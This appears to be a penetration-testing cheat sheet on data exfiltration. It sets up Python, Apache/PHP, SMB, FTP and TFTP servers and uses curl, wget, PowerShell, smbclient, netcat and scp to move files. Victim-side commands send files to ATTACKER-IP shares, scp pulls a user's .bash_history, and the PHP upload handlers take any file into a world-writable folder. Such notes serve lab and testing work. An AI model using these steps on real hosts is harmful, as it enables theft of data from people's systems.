# Data exfiltration

* Rule of thumb: Use native tool first
* Pyhton3 Web Server
* Apache Web Server
* Pure FTPd
* aTFTPd

## Use Python3 Web Server

* serve current working directory
* retrieve data with different clients

```bash
python3 -m http.server 8000
wget http://server-ip:8000/filename -O output
curl http://server-ip:8000/filename -o output
```

## Use Apache Web server

* Apache2 is insalled on kali
* config file /etc/apache2/apache2.conf
* default www root /var/www/html/

```bash
sudo apt update && sudo apt install apache2

cat /etc/apache2/apache2.conf
sudo systemctl start apache2

cp file /var/www/html/
ls -al /var/www/html/
```

### Prepare HTML file upload form using PHP

* cp html and php file /var/www/html/
* make upload directory /var/www/html/upload/
* finally restart the apache2 web server to serve the upload
* increase the file upload size sudo vi /etc/php/<version>/apache2/php.ini 
* e.g. **upload_max_filesize = 512M**

```bash
mkdir /var/www/html/uploads/
chmod 777 .
```

```bash
cat /var/www/html/upload.html
<html>
<head></head>
<body>
<h4> File uploads </h4>
<form enctype="multipart/form-data" action="upload.php" method="post">
<p>
Select File:
<input type="file" name="file" />
<input type="submit" name="Upload" value="Upload" />
</p>
</form>
</body>
</html>

```

### Upload and Download using CURL

```bash
curl -F "file=@win-test-curl.txt" http://server-ip/upload.php
curl -G http://server-ip/uploads/win-test-curl.txt -o win-test-curl.txt
```

Using upload.php with error handling

```shell
cat /var/www/html/upload.php               
<!DOCTYPE html>
<html> 
<body> 
<h1>Upload result</h1>

<?php 
$target_path = "uploads/"; 
$target_path = $target_path . basename($_FILES['file']['name']); 

echo "Source = " . $_FILES['file']['name'] . " <br /> \n"; 
echo "Path = " . $target_path . " <br /> \n"; 
echo "Size = " . $_FILES['file']['size'] . " <br /> \n\n"; 

if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) { 
echo "Success. The file " . basename( $_FILES['file']['name']) . " has been uploaded."; 
} else { 
echo "Error uploading the file failed, please try it again!"; 
} 
?>

</body> 
</html> 
```

Or simply ...

```bash
cat upload.php
<?php 
$uploaddir = "/var/www/html/uploads/";
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

### Upload and Download using WGET

* use with care, uses raw content
* allows to make wget calls easier

```shell
wget --post-file win-test-wget.txt http://server-ip/wget-upload.php?filename=win-test-wget.txt
wget http://server-ip/uploads/win-test-wget.txt
```

Using wget-upload.php with error handling

```shell
cat /var/www/html/wget-upload.php

<!DOCTYPE html>
<html>
<body>
<h1>Upload result</h1>

<?php

// Read raw POST body
$data = file_get_contents("php://input");

// Get filename from query string: ?filename=example.bin
if (!isset($_GET['filename']) || $_GET['filename'] === '') {
  die("No filename provided\n");
}
$filename = basename($_GET['filename']);

// security: strip paths
$target = "uploads/" . $filename;

// Save file
$bytes = file_put_contents($target, $data);

header("Content-Type: text/plain");
if ($bytes === false) {
  echo "Error. Failed to write file!\n";
} else
{
  echo "Source = $filename\n";
  echo "Path = $target\n";
  echo "Size = " . $bytes . "\n";
  echo "Success. The file $filename has been uploaded.\n";
}

?>

</body>
</html>

```

### Upload and Download using Powershell

```powershell
$rsp=(New-Object Net.WebClient).UploadFile('http://remote-ip/ps-upload.php', 'win-test-ps.txt'); $[Text.Encoding]::UTF8.GetString($rsp)
(New-Object System.Net.WebClient).DownloadFile("http://remote-ip/uploads/win-test-ps.txt", "win-test-ps.txt")
```

Using the ps-upload.php for simplicity without error handling

* '$' must be escaped in bash scripts
* \$

```bash
cat /var/www/html/ps-upload.php   
<?php 
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
    echo "Upload done.";
else
    echo "Upload error!";
?>

```

## Use SMB anonymous share

Scenario

* Use an anonymous share for data exfiltration from Windows or Linux
* Install `apt install samba` and configure anoymous `share` folder
* Run samba deamon `systemctl start smdb` and verify with upload

Attacker

```bash
# Install and configure share folder
sudo apt install samba
sudo cat /etc/samba/smb.conf

[share]
   path = /var/lib/samba/share
   comment = Data Exfiltration
   browsable = yes
   writable = yes
   guest ok = yes
;   guest only = yes
   force user = nobody
   create mask = 0666
   directory mask = 0755

# Create world writeable folder
sudo mkdir -p /var/lib/samba/share
sudo chmod -R 0777 /var/lib/samba/share
sudo chown -R nobody:nogroup /var/lib/samba/share

# Add user to samba share
sudo smbpasswd -a kali
Password: kali

# Run samba deamon
sudo systemctl start smbd
enum4linux -S ATTACKER-IP | grep -P "/share|Data Exfiltration"

share           Disk      Data Exfiltration
//ATTACKER-IP/share  Mapping: OK Listing: OK Writing: N/A
```

Victim

```bash
# Anonymous file upload and download (linux)
smbclient //ATTACKER-IP/share -U "" -N -c 'put smbtest.txt'
smbclient //ATTACKER-IP/share -U "" -N -c 'get smbtest.txt'

# Anonymous file upload and download (windows)
copy .\path\to\file \\REMOTE-IP\share\upload
copy \\REMOTE-IP\share\download copy .\path\to\file
```

## Install and configure Pure FTP

* create virtual ftp user kali
* attach it to nobody:nogroup system user
* create a password for ftp user kali
* make /var/lib/ftp/share writeable for pure-ftpd

```bash
sudo apt update && sudo apt install pure-ftpd

cat <<EOF > ./setup-ftp.sh
#!/bin/bash
#sudo groupadd nobody
#sudo useradd -g nogroup -d /dev/null nodody
# Password: kali
sudo pure-pw useradd kali -u nobody -g nogroup -d /var/lib/ftp/share
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /var/lib/ftp/share
sudo chown -R nobody:nogroup /var/lib/ftp/share
sudo chmod 777 /var/lib/ftp/share
sudo systemctl restart pure-ftpd
EOF

chmod u+x setup-ftp.sh
sudo ./setup-ftp.sh
systemctl status pure-ftpd
```

## Install and confiugre TFTP

* create /tftp folder
* change owner of /tftp
* start deamon on udp port 69

```bash
sudo apt update && sudo apt install atftpd

cat <<EOF > setup-atftpd.sh
#!/bin/bash

sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
EOF
```

## Connect FTP

Anoymous connect

```bash
ftp host-IP
Name: anonymous
<Enter>

ftp> ls
ftp> get somefile.txt
ftp> put somefile.bin
ftp> quit

# disable passive mode
ftp> passive
# binary file transfer
ftp> binary
# text file only transfer (use with caution)
ftp> ascii

```

## Connect to TFTP

```bash
tftp host-IP
# ls option is by default deactivated
tftp> get somefile.txt
tftp> put somefile.txt
```


## Netcat

```bash
nc -lvnp 1234 > receive.txt
nc -vn host-IP 1234 < send.txt
```

## SCP

```bash
scp user@IP:/home/user/.bash_history history.txt
```
